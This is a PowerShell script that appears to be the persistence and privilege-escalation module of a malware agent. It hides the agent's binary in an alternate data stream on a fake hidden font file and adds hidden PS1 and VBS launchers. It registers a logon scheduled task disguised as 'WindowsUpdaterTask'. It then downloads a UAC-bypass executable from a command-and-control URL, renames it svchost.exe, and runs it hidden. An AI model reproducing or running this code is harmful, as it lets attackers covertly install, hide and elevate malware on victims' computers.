$ProgressPreference = 'SilentlyContinue'
$ErrorActionPreference = 'SilentlyContinue'

param($args)

$agentPath = $env:AgentPath
if (-not $agentPath) {
    Write-Output "❌ AgentPath not set."
    exit
}

# ---- 1. Fake font file & ADS ----
$fontDir = "$env:LOCALAPPDATA\Microsoft\Windows\Fonts"
if (-not (Test-Path $fontDir)) {
    New-Item -ItemType Directory -Path $fontDir -Force | Out-Null
    attrib +h $fontDir
}
$fontFile = "$fontDir\seguibl.ttf"
if (-not (Test-Path $fontFile)) {
    Set-Content -Path $fontFile -Value "TTF fake font file - do not delete" -Encoding ASCII -Force
    attrib +h $fontFile
}

$streamName = "Zone.Identifier"
$agentBytes = [System.IO.File]::ReadAllBytes($agentPath)
Set-Content -Path $fontFile -Stream $streamName -Value $agentBytes -Encoding Byte

# ---- 2. Launcher scripts ----
$launcherPath = "$fontDir\run.ps1"
$launcherContent = @"
`$ProgressPreference = 'SilentlyContinue'
`$fontFile = '$fontFile'
`$streamName = '$streamName'
`$tempAgent = "`$env:TEMP\agent.exe"
if (Test-Path `$tempAgent) { Remove-Item `$tempAgent -Force -ErrorAction SilentlyContinue }
`$bytes = Get-Content -Path `$fontFile -Stream `$streamName -Encoding Byte -Raw -ErrorAction SilentlyContinue
if (`$bytes) {
    [System.IO.File]::WriteAllBytes(`$tempAgent, `$bytes)
    Start-Process -WindowStyle Hidden `$tempAgent
}
"@
Set-Content -Path $launcherPath -Value $launcherContent -Encoding ASCII -Force
attrib +h $launcherPath

$vbsPath = "$fontDir\run.vbs"
$vbsContent = @"
Set WshShell = CreateObject("WScript.Shell")
WshShell.Run "powershell.exe -NoProfile -ExecutionPolicy Bypass -File ""$launcherPath""", 0, False
"@
Set-Content -Path $vbsPath -Value $vbsContent -Encoding ASCII -Force
attrib +h $vbsPath

# ---- 3. Scheduled task ----
$taskName = "WindowsUpdaterTask"
$taskCreated = $false
try {
    $taskService = New-Object -ComObject Schedule.Service
    $taskService.Connect()
    $rootFolder = $taskService.GetFolder("\")
    try { $rootFolder.DeleteTask($taskName, 0) *>$null } catch { }
    $taskDefinition = $taskService.NewTask(0)
    $taskDefinition.RegistrationInfo.Description = "Windows Updater Task"
    $taskDefinition.Principal.UserId = $env:USERNAME
    $taskDefinition.Principal.LogonType = 3
    $trigger = $taskDefinition.Triggers.Create(9)
    $trigger.UserId = $env:USERNAME
    $action = $taskDefinition.Actions.Create(0)
    $action.Path = "wscript.exe"
    $action.Arguments = "`"$vbsPath`""
    $rootFolder.RegisterTaskDefinition($taskName, $taskDefinition, 6, $null, $null, 3) | Out-Null
    $taskCreated = $true
} catch {
    schtasks /delete /tn $taskName /f *>$null
    schtasks /create /tn $taskName /tr "wscript.exe `"$vbsPath`"" /sc onlogon /ru $env:USERNAME /f /it *>$null
    if ($LASTEXITCODE -eq 0) { $taskCreated = $true }
}

# ---- 4. Elevation (only once) ----
$regFlag = "HKCU:\Software\WindowsUpdate"
$alreadyElevated = Test-Path $regFlag
$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

if (-not $alreadyElevated -and -not $isAdmin) {
    $c2Base = $env:C2BaseURL
    if (-not $c2Base) {
        Write-Output "❌ C2BaseURL not set. Cannot download bypass."
        exit 1
    }

    $bypassUrl = "$c2Base/bin/uac_bypass.exe"
    $bypassPath = "$env:TEMP\svchost.exe"
    $tempAgent = "$env:TEMP\winupdate.exe"

    try {
        Write-Output "Downloading bypass from $bypassUrl ..."
        Invoke-WebRequest -Uri $bypassUrl -OutFile $bypassPath -UseBasicParsing -ErrorAction Stop
        Copy-Item $agentPath $tempAgent -Force
        Write-Output "Launching bypass..."
        Start-Process -WindowStyle Hidden -FilePath $bypassPath -ArgumentList $tempAgent
        Start-Sleep -Seconds 5
        Remove-Item $bypassPath -Force -ErrorAction SilentlyContinue
        New-Item -Path $regFlag -Force | Out-Null
        Write-Output "Elevation attempted (check for elevated agent)."
    } catch {
        Write-Output "Elevation failed: $_"
    }
} else {
    if ($alreadyElevated) { Write-Output "Elevation already attempted; skipping." }
    if ($isAdmin) { Write-Output "Already running elevated; skipping bypass." }
}

if (-not $taskCreated) {
    Write-Output "❌ Persistence failed"
} else {
    Write-Output "✅ Persistence installed. Elevation will be attempted once."
}